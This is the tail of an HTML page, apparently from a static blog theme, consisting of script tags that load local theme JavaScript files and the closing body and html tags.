  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
